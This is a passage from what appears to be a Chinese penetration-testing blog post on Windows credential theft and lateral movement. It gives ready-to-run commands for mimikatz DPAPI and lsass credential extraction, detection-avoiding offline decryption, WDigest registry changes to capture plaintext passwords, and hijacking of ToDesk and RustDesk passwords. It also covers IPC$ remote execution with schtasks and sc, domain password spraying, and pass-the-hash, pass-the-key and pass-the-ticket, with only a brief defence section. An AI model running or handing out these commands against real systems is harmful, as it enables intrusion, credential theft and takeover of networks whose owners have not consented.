data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207160748531.png\" alt=\"image-20221207160748531\"></p>\n<h4 id=\"在线破解\"><a class=\"markdownIt-Anchor\" href=\"#在线破解\">#</a> 在线破解</h4>\n<p>1、使用 mimikatz 获取该文件的 MasterKey 的 guid</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz dpapi::cred /in:C:\\Users\\Administrator\\appdata\\local\\microsoft\\credentials\\FF22A1FDA68FD8515B52C534E8655421</span><br></pre></td></tr></table></figure>\n<p>2、找到内存中对应的 MasterKey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>\n<p>3、最后打开 mimikatz 通过 MasterKey 值去解密凭据文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:凭据文件路径 /masterky:masterkey值</span><br></pre></td></tr></table></figure>\n<p><strong>离线破解</strong></p>\n<p>由于我们不能保证我们的 mimikatz 是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目的其实很简单，就是把目标的文件和内存下载回来，在 vps 或本机上进行 mimikatz 解密即可。</p>\n<p>1、下载目标内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">procdump.exe ‐accepteula ‐ma lsass.exe lsass1.dump 导出lsass</span><br></pre></td></tr></table></figure>\n<p>2、下载目标的 Credentials 文件</p>\n<p>3、用 mimikatz 载入 dump 回来的内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sekurlsa::minidump lsass1.dump</span><br></pre></td></tr></table></figure>\n<p>4、获取 Credentials 的 GUID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421</span><br></pre></td></tr></table></figure>\n<p>5. 获取内存中所有的 MasterKey</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>\n<p>6、利用 MasterKey 解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::cred /in:FF22A1FDA68FD8515B52C534E8655421 /masterkey:b3354c56cd35630d10aa7477c3d16e9b94587f1dc6f9d0c8fcb72a5e4a25c8aab8fa242194666c4cc4be9485c31af555b01a49abbfbb8cc1c00d209da624f33c</span><br></pre></td></tr></table></figure>\n<h3 id=\"winser-2012r2之后抓密码方式\"><a class=\"markdownIt-Anchor\" href=\"#winser-2012r2之后抓密码方式\">#</a> winser - 2012R2 之后抓密码方式</h3>\n<p>在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取</p>\n<p><strong>修改注册表和锁屏</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 开启</span><br><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></pre></td></tr></table></figure>\n<p>锁屏后重新输入密码在 lsass 中才会再次存储明文密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rundll32.exe user32.dll,LockWorkStation 锁屏</span><br><span class=\"line\">query user 查询登录</span><br><span class=\"line\">logoff ID 下载</span><br></pre></td></tr></table></figure>\n<h3 id=\"防范\"><a class=\"markdownIt-Anchor\" href=\"#防范\">#</a> 防范</h3>\n<p><strong>2012R2 域控设置</strong></p>\n<p>在 windows server 2012 R2 中，新增了一个 Protected Users 安全组，将用户加入到该组，用户的明文密码就不会被获取</p>\n<p><strong>安装 KB2871997</strong></p>\n<p>2014 年，Microsoft 发布了 KB2871997 补丁，它主要囊括了 Windows 8.1 和 Windows Server 2012 R2 中增强的安全保护机制。所以，以往的例如：Windows 7，Windows 8，Windows Server 2008R2 和 Windows Server 2012 也可以更新该补丁后获得上述安全保护机制。该补丁无法阻止” 哈希传递 “的攻击方式，但其确实有助于是 Windows 免受一些常见的攻击，例如：明文密码脱取、RDP 凭据盗取、盗取本地 Administrator 账户进行横向移动。</p>\n<p>修改注册表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></pre></td></tr></table></figure>\n<h2 id=\"横向\"><a class=\"markdownIt-Anchor\" href=\"#横向\">#</a> 横向</h2>\n<h3 id=\"向日葵内网横向\"><a class=\"markdownIt-Anchor\" href=\"#向日葵内网横向\">#</a> 向日葵内网横向</h3>\n<p>向日葵远程控制软件是一款免费的集远程控制电脑 / 手机 / 平板、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件，且还能进行远程文件传输、远程摄像头监控等。</p>\n<p>支持系统：Winodws/Linux/MacOS/Android/iOS</p>\n<p>使用注册注册表的方式进行绕过，注册表文件如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\">[HKEY_CURRENT_USER\\SOFTWARE\\Oray\\SunLogin\\SunloginClient]</span><br><span class=\"line\">&quot;11.1.0.37237_IsRunSeted&quot;=&quot;1&quot;</span><br></pre></td></tr></table></figure>\n<p>将以上的代码保存为，xxx.reg 如（1.reg）</p>\n<p>运行注册注册表的命令和运行向日葵</p>\n<p>查看向日葵配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell type C:\\ProgramData\\Oray\\SunloginClient\\config.ini</span><br><span class=\"line\">fastcode：本机识别码去掉k</span><br><span class=\"line\">encry_pwd：本机验证码，密文无法直接解密</span><br></pre></td></tr></table></figure>\n<h3 id=\"todesk内网横向\"><a class=\"markdownIt-Anchor\" href=\"#todesk内网横向\">#</a> todesk 内网横向</h3>\n<p>ToDesk 是一款类似向日葵的远程控制软件，但比向日葵、TV 和 AD 更为流畅和稳定，它同样具备着内网穿透、文件传输、云端同步和流量加密等功能</p>\n<p>有绿色精简版和全功能版两个版本，支持的系统有：Winodws/Linux/MacOS/Android/iOS</p>\n<p>全功能版在双击运行、命令行执行时都会出现 UAC 弹窗和安装界面，这样非常容易被管理员发现，/S 参数可以实现静默安</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell ToDesk1.exe /S</span><br></pre></td></tr></table></figure>\n<p>安装完成后自动运行，接下来查看配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell type C:\\&quot;Program Files (x86)&quot;\\ToDesk\\config.ini</span><br></pre></td></tr></table></figure>\n<p>运行 ToDesk 后会在默认安装目录下生成一个 confifig.ini 配置文件，存储的有设备代码、临时密码、安全密码以及登录用户和密码等重要敏感信息，但密码都经过 ToDesk 特有加密算法加密，所以不能通过解密得到明文密码，只需要找到目标主机 ToDesk 中的 tempAuthPassEx 临时密码或 authPassEx 安全密码，将它们覆盖到我们本地 ToDesk 中的 tempAuthPassEx，重启 ToDesk 即可得到明文密码</p>\n<p>使用 cs 进行文件替换</p>\n<p>重启程序就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklis 查找进程</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /pid 2484 /F</span><br><span class=\"line\">taskkill /pid 2212 /F</span><br></pre></td></tr></table></figure>\n<p>重新开启</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell C:\\&quot;Program Files (x86)&quot;\\ToDesk\\ToDesk.exe</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用远控工具gotohttp横向移动\"><a class=\"markdownIt-Anchor\" href=\"#利用远控工具gotohttp横向移动\">#</a> <strong>利用远控工具 GoToHTTP 横向移动</strong></h3>\n<p>GotoHTTP 工作在 B2C 模式。使用远程控制时，您不必在每一台电脑上都安装远程软件。不管身处何处，有浏览器就能访问远程电脑。 即使公司网络管控，仍然可以控制或被控制。支持文件传输、无人值守、剪切板同步、远程语音、远程摄像头、多显示器支持</p>\n<p>运行该文件</p>\n<p>在运行目录下会生成一个配置文件</p>\n<p>查看配置文件里面有连接地址和账号密码</p>\n<p>使用网页连接</p>\n<h3 id=\"rustdesk\"><a class=\"markdownIt-Anchor\" href=\"#rustdesk\">#</a> rustdesk</h3>\n<p>远程桌面软件，开箱即用，无需任何配置，完美替代 TeamViewer。您完全掌控数据，不用担心安全问题。您可以使用我们的注册 / 中继服务器，或者自己设置，亦或者开发您的版本。</p>\n<p>上传到目标机器</p>\n<p>运行程序</p>\n<p>找到配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\用户名\\AppData\\Roaming\\RustDesk\\config</span><br></pre></td></tr></table></figure>\n<p>可以看到没有密码，这个时候需要手写这个密码，然后重启工具</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist</span><br><span class=\"line\">taskkill /pid 2988 /F</span><br></pre></td></tr></table></figure>\n<p>查看密码已经可以了</p>\n<p>连接目标</p>\n<h3 id=\"ipc横向\"><a class=\"markdownIt-Anchor\" href=\"#ipc横向\">#</a> IPC 横向</h3>\n<p>IPC (Internet ProcessConnection) 共享 “命名管道” 的资源，是为了实现进程间通信而开放的命名管道。IPC 可以通过验证用户名和密码获得相应的权限，通常在远程管理计算机和查看计算 机的共享资源时使用。</p>\n<p>通过 ipc$, 可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列 表等信息。</p>\n<p><strong>mimikatz 抓取密码如果只是管理员组的用户需要绕过 UAC</strong></p>\n<p>首先，需要建立一个 ipc$</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.30\\ipc$ &quot;密码&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use</span><br></pre></td></tr></table></figure>\n<p><strong>IPC$ 利用条件</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、开启了139、445端口</span><br><span class=\"line\">ipcs可以实现远程登录及对默认共享资源的访问,而139端口的开启表示NetBIOS协议的应 用。通过139、445( Windows2000)端口,可以实现对共享文件打印机的访问。因此,一般来讲,ipcs需要139、445端口的支持。</span><br><span class=\"line\">2、管理员开启了默认共享</span><br><span class=\"line\">默认共享是为了方便管理员进行远程管理而默认开启的,包括所有的逻辑盘(c$、d$、e$等和系统目录winnt或 windows( adminS)通过ipc$,可以实现对这些默认共享目录的访问</span><br></pre></td></tr></table></figure>\n<p><strong>IPC$ 连接常见错误</strong></p>\n<blockquote>\n<p>错误号 5: 拒绝访问</p>\n<p>错误号 51: Windows 无法找到网络路径，即网络中存在问题。</p>\n<p>错误号 53: 找不到网络路径，包括 IP 地址错误、目标未开机、目标的 lanmanserver 服务未 启动目标有防火墙 (端口过滤)</p>\n<p>错误号 67: 找不到网络名，包括 lanmanworkstation 服务未启动、ipcs 已被删除</p>\n<p>错误号 1219: 提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了 ipcs, 需要在删除原连接后重新进行连接。</p>\n<p>错误号 1326: 未知的用户名或错误的密码</p>\n<p>错误号 l792; 试图登录，但是网络登录服务没有启动，包括目标 NetLogon 服务未启动（连 接域控制器时会出现此情况）。</p>\n<p>错误号 2242: 此用户的密码已经过期 ° 例如’目标机器设置了账号管理策略，强制用户定 期修改密码</p>\n</blockquote>\n<p><strong>如果两端用户名密码都一样，比如都是 administrator，且密码都一样，可以直接建立 ipc</strong></p>\n<p><strong>利用方式 - windows 自带命令</strong></p>\n<p><strong>dir 命令</strong></p>\n<p>在使用 netuse 命令与远程目标机器建立 ipcs 后，可以使用 dir 命令列出远程主机中的文件，如图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir \\\\192.168.18.10\\c$</span><br></pre></td></tr></table></figure>\n<p><strong>tasklist 命令</strong></p>\n<p>在使用 net use 命令与远程目标机器建立 ipcs 后，可以使用 tasklist 命令的 / S、/U/P 参数列 出远程主机上运行的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tasklist /s 192.168.18.10</span><br></pre></td></tr></table></figure>\n<p><strong>利用方式 - schtasks</strong></p>\n<p>1）查看系统时间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net time \\\\IP地址</span><br></pre></td></tr></table></figure>\n<p>2）复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 文件 \\\\IP地址\\C$</span><br></pre></td></tr></table></figure>\n<p>3）创建计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /u  /p  /s IP地址 /tn 计划任务名 /sc onstart /tr c:\\文件 /ru system /f</span><br></pre></td></tr></table></figure>\n<p>4）执行计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /run /s IP地址 /i /tn &quot;计划任务名&quot;</span><br><span class=\"line\">// 执行成功后以system上线</span><br></pre></td></tr></table></figure>\n<p>5）删除计划任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /delete /s IP地址 /tn &quot;计划任务名&quot; /f</span><br></pre></td></tr></table></figure>\n<p>6）清除 IPC 连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\IP /del /y</span><br></pre></td></tr></table></figure>\n<h3 id=\"ipc配合系统服务横向移动\"><a class=\"markdownIt-Anchor\" href=\"#ipc配合系统服务横向移动\">#</a> <strong>IPC 配合系统服务横向移动</strong></h3>\n<p><strong>SC 命令详解</strong></p>\n<p>获取到密码并着手横向时，却发现 Task Sheduler 服务没有启用。这时候我们就可以远程建立服务，后再启用服务来运行我们想要运行的命令。</p>\n<p>IPC 建立连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.41.40\\ipc$ &quot;Admin@123&quot; /user:administrator</span><br></pre></td></tr></table></figure>\n<p>复制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy C:\\Users\\Administrator\\Desktop\\wanli.exe \\\\192.168.41.40\\C$</span><br></pre></td></tr></table></figure>\n<p>创建服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.41.40 create test binpath= &quot;cmd.exe /c c:\\wanli.exe&quot;</span><br></pre></td></tr></table></figure>\n<p>开启服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.17.138 start test</span><br></pre></td></tr></table></figure>\n<p>删除服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.17.138 delete test</span><br></pre></td></tr></table></figure>\n<p>上线机器</p>\n<h3 id=\"password-spraying密码喷洒攻击和域内用户枚举横向移动\"><a class=\"markdownIt-Anchor\" href=\"#password-spraying密码喷洒攻击和域内用户枚举横向移动\">#</a> <strong>Password Spraying 密码喷洒攻击和域内用户枚举横向移动</strong></h3>\n<p><strong>域内用户枚举攻击原理</strong></p>\n<p>正常域用户登录主机，我们可以通过 &quot;net user /domain&quot; 来列举出域内的用户。但是当我们用非域用户进行登录时，是不能使用 &quot;net user /domain&quot; 这条命令的。或者当主机不在域内但是能与域控通信时，以上两种情况我们可以通过以下方法对域内用户进行枚举。</p>\n<p>Kerberos 本身是一种基于身份认证的协议，在 Kerberos 协议认证的 第一阶段 AS-REQ ，当用户不存在时，返回包提示错误。当用户名存在，密码正确和密码错误时，AS-REP 的返回包不一样。所以可以利用这点，对域内进行域用户枚举和密码喷洒攻击。在 AS-REQ 阶段客户端向 AS 发送用户名，AS 对用户名进行验证，用户存在和不存在返回的数据包不一样，所以，根据 AS 的返回包来对域用户进行枚举</p>\n<p><strong>枚举工具介绍</strong></p>\n<p><strong>kerbrute 工具</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerbrute.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br></pre></td></tr></table></figure>\n<p><strong>密码喷洒攻击原理</strong></p>\n<p>在确认用户存在后，客户端又会发送一个 AS-REQ 请求，如果密码正确，则返回 AS-REP。否则返回 KRB5KDC_ERP_PREAUTH_FAILED，</p>\n<p>在常规的爆破中，我们都是先用很多密码去碰撞一个账号，这样很容易导致账号被锁定。而密码喷洒就是<strong>先用一个密码去碰撞很多账号</strong>，此方法能有效的避免账号被锁定的问题</p>\n<p><strong>kerbrute 工具</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerbrute.exe passwordspray -d hack.com 1.txt Admin@123</span><br></pre></td></tr></table></figure>\n<p><strong>CrackMapExec</strong></p>\n<p>CrackMapExec（⼜名 CME）是⼀款⾮常好⽤的密码喷洒攻击的⼯具，在 Kali Linux 默认已经安装好。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 192.168.41.10 -u 1.txt -p &#x27;Admin@123&#x27; --continue-on-success</span><br></pre></td></tr></table></figure>\n<p>使用前提：设置代理 将 192.168.41.10 的流量代理到 kali 上</p>\n<p><strong>DomainPasswordSpray.ps1</strong></p>\n<p>必须是域内用户才可以</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserList：用户字典</span><br><span class=\"line\">Password：单个密码</span><br><span class=\"line\">PasswordList：密码字典</span><br><span class=\"line\">OutFile：输出的文件名</span><br><span class=\"line\">Domain：要爆破的域</span><br><span class=\"line\">Force：强制喷洒继续，而不提示确认</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module DomainPasswordSpray.ps1 导入</span><br><span class=\"line\">Invoke-DomainPasswordSpray -UserList 1.txt -Domain hack.com -Password Admin@123 -Force -OutFile res.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"pth哈希传递横向移动\"><a class=\"markdownIt-Anchor\" href=\"#pth哈希传递横向移动\">#</a> PTH 哈希传递横向移动</h3>\n<p>大多数渗透测试人员都听说过哈希传递 (Pass The Hash) 攻击。该方法通过找到与账户相关 的密码散列值 (通常是 NTLM Hash) 来进行攻击。在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本 地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登 录内网中的其他计算机。同时，通过哈希传递攻击，攻击者不需要花时间破解密码散列值 (进而获得密码明文)。 在 Windows 网络中，散列值就是用来证明身份的 (有正确的用户名和密码散列值，就能通过验证), 而微软自己的产品和 工具显然不会支持这种攻击，于是，攻击者往往会使用第三方工具来 完成任务。在 WindowsServer2012R2 及之后版 本的操作系统中，默认在内存中不会记录明文密码，因此，攻击者往往会使用工具将散列值传递到其他计算机中，进行权 限验证，实现对远程计 算机的控制。</p>\n<p><strong>希传递攻击原理</strong></p>\n<p>当用户需要登录某网站时，如果该网站使用明文的方式保存用户的密码，那么，一旦该网站出现安全漏洞，所有用户的明 文密码均会被泄露。由此，产生了散列值的概念。当用户设置密码时，网站服务器会对用户输入的密码进行散列加密 处理 (通常使用 MD5 算法) 散列加密算法般为单向不可逆算法。当用户登录网站时，会先对用户输入的密码进行散列加 密处理，再与数据 库中存储的散列值进行对比，如果完全相同则表示验证成功。 主流的 Windows 操作系统，通常会使用 NTLM Hash 对访问资源的用户进行身份验证。早期 版本的 Windows 操作系 统，则使用 LMHash 对用户密码进行验证。但是，当密码大于等于 14 位 时，就无法使用 LM Hash 了。从 Windows vista 和 Windowsserver2008 版本开始，Windows 操作 系统默认禁用 LMHash, 因为在使用 NTLM Hash 进行身份认 证时，不会使用明文口令，而是将明文口令通过系统 API (例如 Lsalogon User) 转换成散列值。不过，攻击者在获得密 码散列值之 后，依旧可以使用哈希传递攻击来模拟用户进行认证。</p>\n<p><strong>哈希传递条件</strong></p>\n<p>哈希传递攻击的前提：有管理员的 NTLM Hash ，并且目标机器开放 445 端口。</p>\n<p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p>\n<p><strong>Windows Vista 之后的机器，只能是 administrator (SID 为 500) 用户的哈希值才能进行哈希传递攻击</strong>，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问</p>\n<p>在工作组环境中：</p>\n<p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p>\n<p>WindowsVista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问。</p>\n<p>在域环境中：</p>\n<p>只能是域管理员组内用户 (可以是域管理员组内非 administrator 用户) 的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器</p>\n<p>使用 mimikatz 进行 hash 传递，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:hack.com /ntlm:570a9a65db8fba761c1008a51d4c95ab</span><br></pre></td></tr></table></figure>\n<p>传递完成后会弹出一个框可以进行链接了</p>\n<p>使用 cs</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210175949983.png\" alt=\"image-20221210175949983\"></p>\n<h3 id=\"pass-the-key密钥传递攻击ptk横向攻击\"><a class=\"markdownIt-Anchor\" href=\"#pass-the-key密钥传递攻击ptk横向攻击\">#</a> <strong>pass the key 密钥传递攻击 (PTK) 横向攻击</strong></h3>\n<p>WinXP/2003/Vista/2008 ，以及未打 KB2871997 补丁之前的 Win7/2008r2/8/2012，这些环境我们都可以使用 NTLM 哈希传递</p>\n<p>对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012，可以<strong>使用 AES keys 代替 NTLM 来进行验证</strong></p>\n<p><strong>KB2871997</strong>：禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行 wmi、psexec、schtasks、at 和访问文件共享。</p>\n<p>这个补丁发布后常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator (SID 500) 账号例外，利用这个账号仍可以进行 Pass The Hash 远程连接，即使 administrator 修改了名字但是还可以<strong>通过 AES 密钥来替代 NTLM 验证进行横向的操作</strong>，其实这个补丁挺鸡肋的，不用 AES 密钥照样也可以用 NTLM，只是需要 Administrator（SID 500），都拿到机器了，Administrator 还不容易吗？这个补丁唯一的好处就是减少存储在内存中的凭据数据，也就是让 wdigest 协议认证的凭据不会存储在 lsass.exe，这样子当你 dump lsass.exe 的时候你就会发现，wdigest 协议中的凭据你就看不到了！</p>\n<p><strong>抓取密码</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa:ekeys</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210182917579.png\" alt=\"image-20221210182917579\"></p>\n<p>传递域中 administrator 的 aes256key</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sekurlsa::pth /user:administrator /domain:hack.com /aes256:b03fcae60f0b32a105a8082e89a09cd88a5a6c54b0a209caaa9664c6bc223232</span><br></pre></td></tr></table></figure>\n<p>传递后在被控机器上弹出一个 system 权限的 cmd</p>\n<p>但是横向时需要使用主机名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net use \\\\2012-1.hack.com</span><br><span class=\"line\">copy C:\\Users\\admin\\Desktop\\wanli.exe \\\\2012-1.hack.com\\C$</span><br><span class=\"line\">schtasks /create /s 2012-1.hack.com /tn test /sc onstart /tr c:\\wanli.exe /ru system /f</span><br><span class=\"line\">schtasks /run /s 2012-1.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"pass-the-ticket-票据传递攻击ptt横向攻击\"><a class=\"markdownIt-Anchor\" href=\"#pass-the-ticket-票据传递攻击ptt横向攻击\">#</a> <strong>pass the ticket</strong> 票据传递攻击 (PTT) 横向攻击</h3>\n<p>要想使用 mimikatz 的哈希传递功能，必须具有本地管理员权限。 mimikatz 同样提供了不需要本地管理员权限进行 横向渗透测试的方法，</p>\n<p>例如票据传递 (PassThe Ticket,PTT)</p>\n<p>票据传递是基于 kerberos 认证的一种攻击方式，常用来做后渗透权限维持。</p>\n<p>黄金票据攻击利用的前提是得到了域内 krbtgt 用户的 NTLM 哈希或 AES-256 的值。</p>\n<p>白银票据攻击利用的前提是得到了域内服务账号的 HTML 哈希或 AES-256 的值。</p>\n<p>票据传递攻击一般分为两种</p>\n<p>1、自己制作票据</p>\n<p>2、传递内存中的票据</p>\n<p>导出内存的票据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; 